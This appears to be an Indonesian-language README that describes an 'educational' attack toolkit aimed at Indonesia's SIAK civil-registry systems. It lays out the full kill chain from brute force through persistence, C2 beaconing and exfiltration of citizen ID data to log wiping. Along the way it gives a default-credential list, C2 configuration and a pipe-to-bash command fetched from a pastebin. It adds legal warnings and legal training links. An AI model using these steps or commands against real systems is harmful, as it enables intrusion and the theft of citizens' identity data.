# ⚠️ ANALISIS TOOLKIT "EDUKASI" — SIAK Suite

> **DISCLAIMER**: Dokumen ini dibuat untuk tujuan **edukasi dan analisis keamanan siber** semata.
> Penggunaan toolkit ini terhadap sistem nyata tanpa izin adalah **ILEGAL** dan melanggar hukum Indonesia.

---

## 📋 Deskripsi Umum

Folder ini berisi **23 file** yang membentuk sebuah **toolkit serangan siber otomatis**.
Toolkit ini dirancang khusus untuk menyerang **sistem SIAK (Sistem Informasi Administrasi Kependudukan)** milik pemerintah Indonesia — yaitu sistem yang menyimpan data penduduk seperti NIK, KTP, dan Kartu Keluarga.

Seluruh file diletakkan **flat dalam satu folder** tanpa subfolder, karena skrip-skripnya saling memanggil menggunakan path relatif sederhana (contoh: `./recon.sh`, `./exfil.sh`).

---

## 📁 Struktur Folder

```
EDUKASI/
├── auto_update.sh          # Auto-update toolkit dari server C2
├── c2_agent.sh             # Beacon ke server Command & Control
├── cleanup.sh              # Penghapusan jejak serangan
├── config.yaml             # Konfigurasi target, C2, dan stealth
├── creds.sh                # Pencurian kredensial
├── encrypt_loot.sh         # Enkripsi data curian sebelum dikirim
├── exfil.sh                # Eksfiltrasi (pencurian) database
├── FINAL_master.sh         # Skrip utama "One Click Domination"
├── inject.py               # SQL/Code injection
├── killchain.sh            # Otomasi seluruh rantai serangan
├── lateral.py              # Pergerakan lateral di jaringan internal
├── master.sh               # Versi sederhana dari FINAL_master.sh
├── metrics.json            # Metrik/laporan hasil serangan
├── persistence.sh          # Mempertahankan akses (cronjob, SSH key)
├── priv_esc.sh             # Privilege escalation (eskalasi hak akses)
├── readme.md               # Dokumentasi ini
├── recon.sh                # Pengintaian dan enumerasi target
├── reverse.php             # Reverse shell multi-protokol (backdoor)
├── runner.py               # Orkestrator — jalankan semua tools paralel
├── shell.py                # Mendapatkan shell/akses ke server
├── siak_enum.py            # Scanner kerentanan khusus SIAK
├── siak_pivot.py           # Pivoting menggunakan data NIK penduduk
└── stealth_mode.patch      # Patch penyamaran anti-deteksi
```

---

## 🎯 Alur Serangan (Kill Chain)

```
┌─────────────────────────────────────────────────────────────┐
│                    ALUR SERANGAN LENGKAP                     │
│                                                             │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────────┐   │
│  │ 1. INTAI │───▶│ 2. MASUK │───▶│ 3. BERTAHAN DI DALAM │   │
│  └──────────┘    └──────────┘    └──────────────────────┘   │
│       │               │                    │                │
│   recon.sh        reverse.php        persistence.sh         │
│   siak_enum.py    killchain.sh       c2_agent.sh            │
│                                                             │
│  ┌──────────────┐    ┌──────────────┐                       │
│  │ 4. CURI DATA │───▶│ 5. HAPUS     │                       │
│  │              │    │    JEJAK      │                       │
│  └──────────────┘    └──────────────┘                       │
│       │                    │                                │
│   exfil.sh           cleanup.sh                             │
│   siak_pivot.py      stealth_mode.patch                     │
│   lateral.py                                                │
│   encrypt_loot.sh                                           │
└─────────────────────────────────────────────────────────────┘
```

---

## 📄 Penjelasan Setiap File

### 🔍 Tahap 1: Pengintaian (Reconnaissance)

#### `recon.sh` — Skrip Pengintaian Lanjutan
- **Fungsi**: Mengumpulkan informasi tentang target secara menyeluruh
- **Cara Kerja**:
  - Enumerasi subdomain massal (subfinder, amass, assetfinder)
  - Crawling URL dan fuzzing direktori/API (katana, ffuf, dirsearch)
  - Analisis file JavaScript untuk mencari API key, password, token
  - Menggunakan WayBack Machine untuk data historis
- **Output**: Laporan lengkap berisi subdomain, API endpoint, parameter, dan secret yang ditemukan
- **Tools yang Dibutuhkan**: subfinder, httpx, ffuf, dirsearch, katana, gau, waybackurls, aquatone

#### `siak_enum.py` — Scanner Kerentanan Khusus SIAK
- **Fungsi**: Mencoba login ke sistem SIAK dengan kredensial default
- **Cara Kerja**: Brute-force login menggunakan kombinasi umum:
  - `admin:admin`, `siak:siak`, `admin:123456`, `root:root`, `siakad:siakad`, `admin:password`
- **Deteksi Berhasil**: Jika respons mengandung kata "dashboard" atau "welcome"

---

### 💉 Tahap 2: Mendapatkan Akses (Initial Access)

#### `reverse.php` — Reverse Shell Multi-Protokol
- **Fungsi**: Backdoor PHP yang memberikan akses remote ke server
- **Cara Kerja**:
  - Menerima parameter `ip`, `port`, `proto` via POST/GET
  - Mendukung 7 metode reverse shell: bash, netcat (2 varian), python, python3, perl, php, socat
  - Anti-deteksi: mematikan error reporting, mencoba berbagai fungsi eksekusi (`system`, `passthru`, `shell_exec`, `exec`, `proc_open`)
- **Penggunaan**: `POST ip=1.2.3.4&port=4444&proto=bash`

#### `killchain.sh` — Otomasi Rantai Serangan Penuh
- **Fungsi**: Menjalankan seluruh tahap serangan secara otomatis
- **Tahapan**: Recon → Vulnscan → Shell → Creds → Privesc → Lateral → Exfil
- **Cara Kerja**:
  1. Jalankan `recon.sh`, `inject.py`, `shell.py` secara paralel
  2. Tunggu 60 detik
  3. Deploy reverse shell via webshell yang ditemukan
  4. Jalankan privilege escalation, lateral movement, dan exfiltrasi

---

### 🔒 Tahap 3: Mempertahankan Akses (Persistence)

#### `persistence.sh` — Pemasangan Backdoor Permanen
- **Fungsi**: Memastikan penyerang bisa masuk lagi kapan saja
- **Cara Kerja**:
  - Menambahkan **cronjob** ke root: menjalankan `shell.php` dari C2 setiap menit
  - Menanam **SSH public key** ke `/root/.ssh/authorized_keys` untuk akses SSH permanen

#### `c2_agent.sh` — Command & Control Beacon
- **Fungsi**: Mengirim informasi sistem ke server penyerang secara berkala
- **Cara Kerja**:
  - Setiap 60 detik, kirim: hostname, IP publik, user aktif, dan waktu
  - Berjalan di background (daemon) tanpa terdeteksi
- **Endpoint**: `http://YOUR_C2:8080/beacon`

---

### 📦 Tahap 4: Pencurian Data (Exfiltration)

#### `exfil.sh` — Toolkit Eksfiltrasi Database
- **Fungsi**: Mencuri seluruh isi database target
- **Fitur**:
  - Mendukung **MySQL, PostgreSQL, MSSQL, SQLite**
  - Menargetkan tabel SIAK secara spesifik: `penduduk`, `nik`, `ktp`, `keluarga`, `users`, `admin`, `pegawai`
  - Cracking hash password menggunakan **hashcat** dan **john**
  - Eksfiltrasi tersembunyi via HTTP atau **DNS tunneling** (fallback)
  - Memecah file besar (>10MB) untuk menghindari deteksi
- **Penggunaan**: `./exfil.sh target.com admin weak123`

#### `siak_pivot.py` — Pivoting Menggunakan Data NIK
- **Fungsi**: Menyalahgunakan data NIK yang dicuri untuk menyerang sistem lain
- **Cara Kerja**:
  1. Konek ke database SIAK (`siakad`)
  2. Ambil 1000 NIK dari tabel `penduduk`
  3. Gunakan NIK sebagai password untuk brute-force SSH ke sistem lain
- **Bahaya**: Penyalahgunaan data identitas warga negara

#### `lateral.py` — Pergerakan Lateral di Jaringan
- **Fungsi**: Mencari server SIAK lain di jaringan internal
- **Cara Kerja**:
  - Scan seluruh subnet (192.168.x.1–254) pada port 80
  - Jika port terbuka, jalankan nmap untuk identifikasi layanan
  - Menggunakan threading untuk kecepatan

#### `encrypt_loot.sh` — Enkripsi Data Curian
- **Fungsi**: Mengamankan data curian sebelum dikirim
- **Cara Kerja**:
  1. Kompres semua folder `loot_*/` menjadi `loot.tar.gz`
  2. Enkripsi dengan **AES-256** (passphrase: `SIAK2024!`)
  3. Upload ke server C2

---

### 🧹 Tahap 5: Penghapusan Jejak (Anti-Forensics)

#### `cleanup.sh` — Pembersihan Jejak
- **Fungsi**: Menghapus semua bukti keberadaan penyerang
- **Cara Kerja**:
  - Hapus bash history (`history -c`)
  - Hapus file temporary (`/tmp/*`, `/var/tmp/*`)
  - Truncate log autentikasi (`/var/log/auth.log`)
  - Matikan semua proses terkait serangan

#### `stealth_mode.patch` — Patch Anti-Deteksi
- **Fungsi**: Menambahkan kemampuan penyamaran ke semua skrip
- **Teknik**:
  - **Random delay** (1–3 detik) antar request untuk menghindari rate-limiting
  - **User-agent palsu** (menyamar sebagai browser biasa atau Googlebot)

---

### ⚙️ File Pendukung & Konfigurasi

#### `config.yaml` — Konfigurasi Pusat
```yaml
c2:
  url: "http://YOUR_C2:8080"       # Alamat server penyerang
  beacon_port: 443                  # Port komunikasi (menyamar sebagai HTTPS)
  encrypt_key: "SIAK2026!"         # Kunci enkripsi

siak:
  default_dbs: ["siakad", "penduduk", "e_ktp"]   # Database target
  tables: ["penduduk", "nik", "kk", "users"]      # Tabel target

stealth:
  user_agents: ["Mozilla/5.0...", "Googlebot/2.1"] # Penyamaran
  delay_range: [1,5]                                # Delay acak (detik)
```

#### `runner.py` — Orkestrator Serangan
- **Fungsi**: Menjalankan semua tools secara paralel dengan koordinasi
- **Fitur**: Random delay antar eksekusi (anti-IDS), auto-deploy persistence

#### `master.sh` & `FINAL_master.sh` — Skrip Utama
- **Fungsi**: "Tombol START" — satu perintah untuk menjalankan seluruh serangan
- `FINAL_master.sh` lebih lengkap: download toolkit → konfigurasi → jalankan → hapus jejak
- **Penggunaan**: `curl -s https://pastebin.com/ULTIMATE | bash -s target.com`

#### `auto_update.sh` — Auto-Update Toolkit
- **Fungsi**: Download versi terbaru toolkit dari server C2 dan jalankan otomatis

#### `metrics.json` — Laporan Hasil Serangan
```json
{
  "target": "siak.kota.go.id",
  "timeline": {
    "recon": "00:32",    // Pengintaian: 32 detik
    "shell": "02:15",    // Dapat akses: 2 menit 15 detik
    "root": "04:47",     // Dapat root: 4 menit 47 detik
    "exfil": "12:23"     // Selesai curi data: 12 menit 23 detik
  },
  "loot": {
    "niks": 245632,      // 245.632 NIK dicuri
    "creds": 47,         // 47 kredensial dicuri
    "size": "1.8GB"      // Total data: 1.8 GB
  }
}
```

---

## ⚖️ Aspek Hukum

Penggunaan toolkit ini terhadap sistem nyata melanggar:

| Undang-Undang | Pasal | Ancaman |
|---------------|-------|---------|
| **UU ITE No. 11/2008** (jo. UU 19/2016) | Pasal 30 — Akses ilegal | Penjara maks. 8 tahun, denda Rp 800 juta |
| **UU ITE** | Pasal 31 — Intersepsi ilegal | Penjara maks. 10 tahun, denda Rp 800 juta |
| **UU ITE** | Pasal 32 — Mengubah/merusak data | Penjara maks. 8 tahun, denda Rp 2 miliar |
| **UU PDP No. 27/2022** | Pasal 67 — Pengumpulan data pribadi ilegal | Penjara maks. 5 tahun, denda Rp 5 miliar |
| **KUHP** | Pasal 362/363 — Pencurian | Penjara maks. 7 tahun |

---

## 🛡️ Rekomendasi untuk Belajar Keamanan Siber Secara Legal

| Platform | Deskripsi | Link |
|----------|-----------|------|
| **TryHackMe** | Belajar hacking dengan lab virtual, cocok pemula | [tryhackme.com](https://tryhackme.com) |
| **HackTheBox** | CTF dan lab untuk penetration testing | [hackthebox.com](https://hackthebox.com) |
| **PortSwigger Academy** | Belajar web security gratis | [portswigger.net/web-security](https://portswigger.net/web-security) |
| **DVWA** | Aplikasi web rentan untuk latihan | [github.com/digininja/DVWA](https://github.com/digininja/DVWA) |
| **OverTheWire** | War games untuk belajar Linux & security | [overthewire.org](https://overthewire.org) |

---

> **Catatan**: Memahami cara kerja serangan siber adalah langkah penting dalam **defensive security**.
> Gunakan pengetahuan ini untuk **melindungi sistem**, bukan untuk menyerang.